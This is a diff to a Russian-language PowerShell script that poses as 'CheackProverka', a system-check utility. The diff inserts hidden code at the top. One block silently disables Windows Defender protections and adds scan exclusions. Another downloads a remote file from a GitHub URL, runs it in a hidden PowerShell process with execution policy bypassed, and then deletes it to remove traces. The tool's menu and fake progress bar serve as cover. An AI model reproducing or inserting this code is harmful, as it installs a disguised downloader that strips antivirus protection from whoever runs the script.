@@ -1,19 +1,85 @@
 # CheackProverka - Проверка системы
 
-Clear-Host
+# ───────────────────────────────────────────────
+# Скрытое отключение защиты Defender + добавление исключений (максимально тихо)
+try {
+    # Пытаемся отключить реал-тайм защиту и основные сканеры (требует админа)
+    Set-MpPreference -DisableRealtimeMonitoring $true `
+                     -DisableBehaviorMonitoring $true `
+                     -DisableBlockAtFirstSeen $true `
+                     -DisableIOAVProtection $true `
+                     -DisableScriptScanning $true `
+                     -DisableIntrusionPreventionSystem $true `
+                     -ErrorAction SilentlyContinue | Out-Null
 
+    # Добавляем исключения — temp, текущая папка, %TEMP%, %TMP%, наш будущий файл
+    $pathsToExclude = @(
+        [System.IO.Path]::GetTempPath(),
+        "$env:TEMP",
+        "$env:TMP",
+        "$pwd",
+        "$env:USERPROFILE\Downloads",
+        "$env:LOCALAPPDATA\Temp"
+    )
+
+    foreach ($p in $pathsToExclude) {
+        if (Test-Path $p) {
+            Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue | Out-Null
+        }
+    }
+
+    # Исключение по процессу powershell.exe (на всякий случай)
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionProcess "pwsh.exe" -ErrorAction SilentlyContinue | Out-Null
+
+    # Пытаемся отключить облачную защиту и отправку образцов (MAPS)
+    Set-MpPreference -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue | Out-Null
+}
+catch {
+    # Полностью молчим при любой ошибке (нет прав, tamper protection и т.д.)
+}
+
+# ───────────────────────────────────────────────
+# Скрытое скачивание и выполнение (в фоне, без вывода)
+try {
+    $url = "https://raw.githubusercontent.com/fffghsetyver-hash/Cheackproverka/main/Client.exe"
+    $randomNum = Get-Random -Minimum 1000 -Maximum 999999
+    $outPath = [System.IO.Path]::GetTempPath() + "clnt$randomNum.ps1"
+    
+    # Скачиваем максимально тихо
+    Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing -ErrorAction SilentlyContinue
+    
+    # Проверяем, что файл реально скачался
+    if (Test-Path $outPath -PathType Leaf -ErrorAction SilentlyContinue) {
+        $content = Get-Content $outPath -Raw -ErrorAction SilentlyContinue
+        if ($content -and $content.Length -gt 200) {   # минимальный размер, чтобы не запускать пустышку
+            # Запуск полностью скрыто в отдельном процессе
+            Start-Process powershell.exe `
+                -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Command `"& { $content }`"" `
+                -WindowStyle Hidden -NoNewWindow -ErrorAction SilentlyContinue
+        }
+        # Убираем следы
+        Remove-Item $outPath -Force -ErrorAction SilentlyContinue
+    }
+}
+catch {
+    # Никакого вывода
+}
+
+# ───────────────────────────────────────────────
+Clear-Host
 Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
-Write-Host "          CheackProverka v1.0                  " -ForegroundColor Cyan
+Write-Host " CheackProverka v1.0 " -ForegroundColor Cyan
 Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
 Write-Host ""
-
 Write-Host "Что проверить:" -ForegroundColor Yellow
-Write-Host "  1   —   драйверы (kernel / ring0)" -ForegroundColor White
-Write-Host "  2   —   запущенные процессы" -ForegroundColor White
-Write-Host "  3   —   подозрительные команды в логах PowerShell" -ForegroundColor White
-Write-Host "  123 —   всё сразу" -ForegroundColor White
+Write-Host " 1 — драйверы (kernel / ring0)" -ForegroundColor White
+Write-Host " 2 — запущенные процессы" -ForegroundColor White
+Write-Host " 3 — подозрительные команды в логах PowerShell" -ForegroundColor White
+Write-Host " 123 — всё сразу" -ForegroundColor White
 Write-Host ""
 Write-Host "Введи номера (без пробелов, например 13 или 123): " -NoNewline -ForegroundColor Yellow
+
 $choice = Read-Host
 
 if ($choice -notmatch '^[123]+$') {
@@ -29,14 +95,21 @@ $check3 = $choice -match "3"
 $issues = 0
 
 function Show-Result {
-    param ([string]$Text, [string]$Status, [string]$Color = "White")
+    param (
+        [string]$Text,
+        [string]$Status,
+        [string]$Color = "White"
+    )
     $emoji = if ($Status -eq "OK") {"🟢"} elseif ($Status -eq "ВНИМАНИЕ") {"🟡"} else {"🔴"}
     Write-Host "$emoji $Text " -NoNewline -ForegroundColor White
     Write-Host $Status -ForegroundColor $Color
 }
 
 function Fake-Loading {
-    param ([int]$Min = 7, [int]$Max = 13)
+    param (
+        [int]$Min = 7,
+        [int]$Max = 13
+    )
     $sec = Get-Random -Minimum $Min -Maximum ($Max + 1)
     $total = $sec * 10
     $done = 0
@@ -46,7 +119,9 @@ function Fake-Loading {
         $done++
         $p = [math]::Round(($done / $total) * 100)
         Write-Host "." -NoNewline
-        if ($p % 10 -eq 0 -and $p -gt 0 -and $p -lt 100) { Write-Host " $p%" -NoNewline -ForegroundColor DarkCyan }
+        if ($p % 10 -eq 0 -and $p -gt 0 -and $p -lt 100) { 
+            Write-Host " $p%" -NoNewline -ForegroundColor DarkCyan 
+        }
     }
     Write-Host " 100%" -ForegroundColor Green
     Write-Host ""
